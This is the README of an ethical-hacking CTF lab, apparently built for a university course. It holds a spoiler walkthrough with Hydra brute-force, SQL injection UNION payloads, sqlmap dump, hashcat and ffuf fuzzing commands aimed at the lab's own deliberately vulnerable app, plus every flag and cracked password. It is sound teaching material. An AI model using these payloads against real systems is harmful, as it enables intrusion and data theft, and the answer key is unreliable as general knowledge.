# NEXUS Corp CTF 🏢🔓

**A multi-level Capture The Flag platform themed as corporate espionage against a corrupt tech corporation.**

Built for the UPMX Ethical Hacking course. 6 levels of escalating difficulty covering brute-force attacks, SQL injection, hash cracking, SSH exploration, LDAP enumeration, and API fuzzing.

---

## 🎯 Challenge Overview

You are a hired operative tasked with infiltrating NEXUS Corp — a corrupt tech corporation hiding illegal operations behind layers of security. Each level breaches a deeper layer of their infrastructure.

| Level | Name | Technique | Tools |
|-------|------|-----------|-------|
| 1 | Employee Portal | Brute-force weak credentials | Hydra, Medusa |
| 2 | HR Database | SQL Injection | sqlmap, manual SQLi |
| 3 | Hash Cracking | Crack MD5/SHA256 hashes | Hashcat, John the Ripper |
| 4 | SSH Infiltration | Filesystem exploration | SSH (simulated terminal) |
| 5 | LDAP Enumeration | Directory service enumeration | LDAP queries |
| 6 | Vault API Fuzzing | API endpoint & parameter discovery | ffuf, curl |

**Flag format:** `NEXUS{...}`

---

## 🚀 Quick Start

### Option 1: Docker (Recommended)

```bash
docker compose up --build -d
```

The platform will be available at `http://localhost:5000`. After team login, the level grid is at `/challenges` (legacy `/dashboard` redirects there).

### Option 2: Local Development

```bash
# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# venv\Scripts\activate   # Windows

# Install dependencies
pip install -r requirements.txt

# Initialize databases
python scripts/init_db.py

# Run development server
python app/main.py
```

### Option 3: Production with Gunicorn

```bash
pip install -r requirements.txt
python scripts/init_db.py
gunicorn --config gunicorn.conf.py app.main:app
```

---

## 🏗️ Project Structure

```
nexus-corp-ctf/
├── app/
│   ├── main.py                 # Flask application (all routes & logic)
│   ├── static/
│   │   ├── css/nexus.css       # Cyberpunk theme stylesheet
│   │   └── js/nexus.js         # Client-side interactions
│   └── templates/
│       ├── base.html           # Base template
│       ├── index.html          # Landing page
│       ├── dashboard.html      # Challenges grid (route `/challenges`)
│       ├── scoreboard.html     # Live rankings
│       └── levels/
│           ├── level1.html     # Employee Portal
│           ├── level2.html     # HR Database (SQLi)
│           ├── level3.html     # Hash Cracking
│           ├── level4.html     # SSH Terminal
│           ├── level5.html     # LDAP Search
│           └── level6.html     # Vault API Fuzzing
├── data/                       # SQLite databases (generated)
├── scripts/
│   └── init_db.py              # Database setup script
├── Dockerfile
├── docker-compose.yml
├── gunicorn.conf.py            # Production server config
├── requirements.txt
├── WALKTHROUGH.md              # Solution guide (SPOILERS)
└── README.md
```

---

## 🗄️ Database Architecture

### `nexus_main.db` (Safe — stores CTF metadata)
- **teams** — Registered team credentials (hashed passwords)
- **progress** — Level completion tracking per team
- **attack_log** — All POST request payloads for monitoring

### `nexus_vulnerable.db` (Intentionally insecure)
- **portal_users** — Weak credentials for Level 1
- **hr_employees** — Employee records (SQLi target in Level 2)
- **ssh_credentials** — Hidden table with password hashes (discovered via SQLi)
- **ldap_directory** — Simulated LDAP entries for Level 5
- **ceo_vault** — Classified documents for Level 6 (discovered via API fuzzing)

---

## 🛡️ Performance & Resilience

The platform is designed to handle heavy attack traffic:

- **Gunicorn** with multiple workers + threads for concurrency
- **Rate limiting** per IP (configurable via `RATE_LIMIT` and `RATE_WINDOW` env vars)
- **SQLite** with separate databases (attack traffic doesn't affect CTF tracking)
- **Docker** for isolated, reproducible deployment
- **Health check** endpoint at `/health`

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `SECRET_KEY` | dev key | Flask session secret (CHANGE IN PROD) |
| `RATE_LIMIT` | 60 | Max requests per IP per window |
| `RATE_WINDOW` | 60 | Rate limit window in seconds |
| `RATE_LIMIT_FUZZ` | 300 | Higher per-IP budget for `/level/6/vault-api` (ffuf) |

---

## Complete walkthrough (SPOILERS — instructors only)

> **Spoilers ahead.** Full solutions for all six levels. Intended for instructors, TAs, and lab operators. **Do not** share this section with participants if you want them to solve the CTF independently. The canonical copy also lives in `WALKTHROUGH.md`; keep both files in sync when you change flags or steps.

### Level 1: Employee Portal (Brute-force)

**Flag:** `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}`

**Solution:** The admin account uses `admin:admin`.

**Hydra example:**

```bash
curl -X POST http://TARGET:5000/level/1/login \
  -d "username=test&password=test"

hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  TARGET http-post-form \
  "/level/1/login:username=^USER^&password=^PASS^:Login failed"
```

**Manual:** Submit `admin` / `admin` in the Level 1 form.

**Other valid logins (non-admin):** `guest:guest`, `root:toor`, `dbadmin:dbadmin` — only `admin` receives the Administrator role and the flag in the JSON response.

---

### Level 2: HR Database (SQL Injection)

**Flag:** `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}`

**Solution:** The search endpoint `/level/2/search` concatenates user input into SQL (intentionally vulnerable).

**Manual SQLi examples:**

```
' OR 1=1 --                    → dump all hr_employees
' UNION SELECT 1,2,3,4 --     → test column count
' UNION SELECT name,sql,3,4 FROM sqlite_master --  → list tables
' UNION SELECT id,hostname,username,password_hash FROM ssh_credentials --  → extract SSH hashes
```

**sqlmap (JSON mode helps parsing):**

```bash
sqlmap -u "http://TARGET:5000/level/2/search?search=test&format=json" --tables

sqlmap -u "http://TARGET:5000/level/2/search?search=test&format=json" \
  -T ssh_credentials --dump
```

**Key data in `ssh_credentials`:**

| hostname | username | password_hash | type |
|----------|----------|----------------|------|
| nexus-internal-srv | sysop | `5b09b6e080c821e463c2b48bc81540f3` | MD5 |
| nexus-backup-srv | backup | `a67c4d15c47b4899e4a71024acf4aaa2` | MD5 |
| nexus-dev-srv | devops | (SHA256 in DB) | SHA256 |

The Level 2 flag is **not** returned by SQLi automatically; teams submit it through the Challenges page (see the **All flags** table at the end of this section).

---

### Level 3: Hash Cracking

**Flag:** `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}`

**Solution:** Crack the MD5 hash for `sysop` from Level 2.

- **Hash:** `5b09b6e080c821e463c2b48bc81540f3`
- **Plaintext:** `Op3r4t0r!`

**Hashcat:**

```bash
echo "5b09b6e080c821e463c2b48bc81540f3" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# -m 0 = MD5
```

**John the Ripper:**

```bash
echo "5b09b6e080c821e463c2b48bc81540f3" > hash.txt
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Submit `Op3r4t0r!` at `/level/3/verify` (POST form on Level 3 page; requires team session) to receive the flag JSON.

---

### Level 4: SSH Infiltration

**Flag:** `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}`

**Solution:** Log into the simulated SSH UI at `/level/4` with `sysop` / `Op3r4t0r!`, then read files.

**Useful commands:**

```bash
ls
cat notes.txt
cat .bash_history
cat /etc/nexus/ldap.conf
cat /etc/nexus/backup.key
cat /tmp/debug_dump.txt    # flag is embedded here
```

**Intel for Level 5:** LDAP URI, base DN `dc=nexuscorp,dc=local`, anonymous bind enabled, admin DN `cn=admin,dc=nexuscorp,dc=local`, admin password `Ldap@dm1n_2024` (from `backup.key`), vault needs clearance 5, service account `vault_svc`.

---

### Level 5: LDAP Enumeration

**Flag:** `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}`

**Solution:** Use the in-browser LDAP form at `/level/5`.

**Step 1 — Anonymous bind:** leave Bind DN and password empty; filter `(objectClass=*)`; attributes `*`. Password hashes appear redacted.

**Step 2 — Admin bind:** Bind DN `cn=admin,dc=nexuscorp,dc=local`, password `Ldap@dm1n_2024`, same filter/attributes. Response includes full `userPassword` hashes and the Level 5 flag in the simulated LDIF output.

**`vault_svc` entry:** `uid=vault_svc`, `clearance_level=5`, `userPassword` is SHA256 of `V4ult_M4st3r_K3y!` (hex digest from `hashlib.sha256` in Python, e.g. `7887cb046d8425acd8a0e48bde7cfa387382ac06a086a471faec90d0f0d17026` for the bundled seed).

**Next step for Level 6:** Crack that SHA256 (hashcat `-m 1400` or John `raw-sha256`), then use the plaintext as `X-Vault-Token` for the Vault API.

---

### Level 6: Vault API Fuzzing (ffuf)

**Flag:** `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`

**Narrative:** Level 5 yields `vault_svc` and its SHA256 hash; after cracking, `V4ult_M4st3r_K3y!` becomes the Vault API token on every request via header `X-Vault-Token`.

**Prerequisite — crack vault hash:**

```bash
echo "<sha256_from_level5_ldap>" > vault_hash.txt
hashcat -m 1400 vault_hash.txt /usr/share/wordlists/rockyou.txt
# Plaintext: V4ult_M4st3r_K3y!
```

**Step 1 — Wordlist (optional; same entries as in-app download):**

```bash
wget http://TARGET:5000/level/6/api-wordlist.txt -O api-wordlist.txt
```

**Step 2 — Phase 1 (discover endpoints):**

```bash
ffuf -w api-wordlist.txt \
  -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  -u http://TARGET:5000/level/6/vault-api/FUZZ \
  -fc 404
```

Expect 200/403 hits on: `status`, `health`, `config` (403), `logs`, `backup`, `archives`.

**Step 3 — Inspect `archives`:**

```bash
curl -s -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  http://TARGET:5000/level/6/vault-api/archives
```

Response hints at `doc_id` and `total_classified: 95`. The `logs` endpoint JSON mentions `doc_id: 73` as a breadcrumb.

**Step 4 — Phase 2 (fuzz `doc_id`):**

```bash
curl -s -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  "http://TARGET:5000/level/6/vault-api/archives?doc_id=1"

seq 1 95 > nums.txt
ffuf -w nums.txt \
  -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  -u "http://TARGET:5000/level/6/vault-api/archives?doc_id=FUZZ" \
  -fw 7
```

The exact `-fw` value depends on Flask JSON layout; run once without `-fw`, note the dominant word count for "not found" responses, then filter. `-fs` (filter by response size) is an alternative.

Only `doc_id=73` returns the full document list; the flag appears inside the `Project_Chimera_Financials.pdf` content in the JSON.

**Common ffuf flags (Level 6):**

| Flag | Purpose |
|------|---------|
| `-w <file>` | Wordlist payloads (replace FUZZ) |
| `-u <url>` | Target URL with FUZZ keyword |
| `FUZZ` | Placeholder replaced per request |
| `-fc 404` | Filter (hide) HTTP 404 (Phase 1) |
| `-fw N` | Filter (hide) responses with N words (Phase 2) |
| `-fs N` | Filter (hide) responses by size (alternative) |
| `-H "Key: Val"` | Send `X-Vault-Token` on every request |

**Difficulty notes:** Two chained fuzz passes; filter tuning; optional log breadcrumb; header auth on every ffuf command.

**Implementation touchpoints:** `app/main.py` (routes, flag, `RATE_LIMIT_FUZZ`, wordlist), `app/templates/levels/level6.html`, `app/templates/dashboard.html`, `WALKTHROUGH.md`, `scripts/init_db.py` (`ceo_vault` seed).

---

### All flags (quick reference)

| Level | Flag |
|-------|------|
| 1 | `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}` |
| 2 | `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}` |
| 3 | `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}` |
| 4 | `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}` |
| 5 | `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}` |
| 6 | `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}` |

---

### Appendix: Why Hydra / sqlmap / ffuf work without Challenges UI “unlocks”

Level progression on the **Challenges grid** (`/challenges`) is cosmetic (Jinja locks links to `#` until the prior flag is submitted). The **server does not enforce a global level chain** on the attack endpoints, so tools can send bare HTTP without a Flask `session` cookie.

**sqlmap on Level 2:** `/level/2/search` has **no** `@team_required`:

```python
@app.route("/level/2/search", methods=["GET", "POST"])
def level2_search():
```

Use `format=json` for cleaner parsing (see Level 2 commands above).

**ffuf on Level 6:** `/level/6/vault-api/*` has **no** `@team_required`; only `X-Vault-Token` (the cracked `vault_svc` password) is checked.

**Where `team_required` still applies:** HTML briefing routes like `/level/2`, `/level/3`, `/level/6` need a logged-in team. `/level/3/verify` also requires session — use browser login or `sqlmap --cookie` / `curl -b` if you refactor.

| Route pattern | Typical protection | External tool without session cookie? |
|---------------|-------------------|--------------------------------------|
| `/level/N` (HTML pages) | `@team_required` | No |
| `/level/1/login` | None | Yes — Hydra |
| `/level/2/search` | None | Yes — sqlmap |
| `/level/3/verify` | `@team_required` | No (unless `--cookie`) |
| `/level/6/vault-api/*` | `X-Vault-Token` | Yes — ffuf with `-H` |

Adding **real** server-side progression would require passing the team cookie into tools (`sqlmap --cookie`, `ffuf -b`), increasing realism and setup cost.

---

## 👥 Team Development Guide

### Git Workflow

```bash
# Clone the repo
git clone https://github.com/YOUR_ORG/nexus-corp-ctf.git
cd nexus-corp-ctf

# Create a feature branch
git checkout -b feature/new-level-or-fix

# Make changes, test locally
python scripts/init_db.py --reset
python app/main.py

# Commit and push
git add .
git commit -m "Add: description of changes"
git push origin feature/new-level-or-fix

# Open a Pull Request on GitHub
```

### Adding a New Level

1. Add the flag to the `FLAGS` dict in `app/main.py`
2. Create the route handlers in `app/main.py`
3. Create the template in `app/templates/levels/levelN.html`
4. Add hints to the `HINTS` dict
5. Add the level card to `dashboard.html` (served at `/challenges`)
6. Add any needed database tables in `init_databases()`
7. Update `total_levels` references

### Team Roles Suggestion

| Role | Responsibility |
|------|---------------|
| **Backend Lead** | Routes, database, new vulnerabilities |
| **Frontend Lead** | Templates, CSS, UX improvements |
| **DevOps** | Docker, deployment, CI/CD |
| **Content** | Narratives, hints, new challenges |
| **QA/Testing** | Test all attack vectors work correctly |

---

## 🔧 Resetting the CTF

```bash
# Reset all databases (clears teams, progress, and reseeds vulnerable data)
python scripts/init_db.py --reset

# Or with Docker
docker compose down -v
docker compose up --build -d
```

---

## ⚠️ Disclaimer

This platform is designed exclusively for **educational purposes** within the UPMX Ethical Hacking course. The vulnerabilities are **intentional** and exist only to teach cybersecurity concepts. Do not deploy this on a public network without proper access controls.

---

**UPMX — Ethical Hacking Lab** | Built with Flask + SQLite + Docker
